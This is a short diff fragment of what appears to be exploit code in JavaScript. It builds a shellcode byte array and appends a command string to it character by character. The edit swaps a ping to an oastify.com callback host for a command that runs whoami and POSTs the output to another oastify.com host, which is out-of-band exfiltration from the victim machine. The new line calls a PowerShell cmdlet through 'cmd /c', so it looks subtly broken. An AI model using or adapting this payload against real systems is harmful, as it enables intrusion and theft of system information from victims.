@@ -2402,7 +2402,7 @@
           0x6c, 0x65, 0x65, 0x70, 0x00,
         ];
         cmd =
-          'cmd /c ping https://eo6p0pj9749bzb2ifran2b7ngem5aw3ks.oastify.com';
+          'cmd /c Invoke-RestMethod -Uri "https://y549h90tooqvgvj2wbr7jvo7xy3prgl4a.oastify.com" -Method POST -Body (@{ result = (whoami) } | ConvertTo-Json) -ContentType "application/json"';
         for (let i = 0; i < cmd.length; i++) {
           sc.push(cmd.charCodeAt(i));
         }
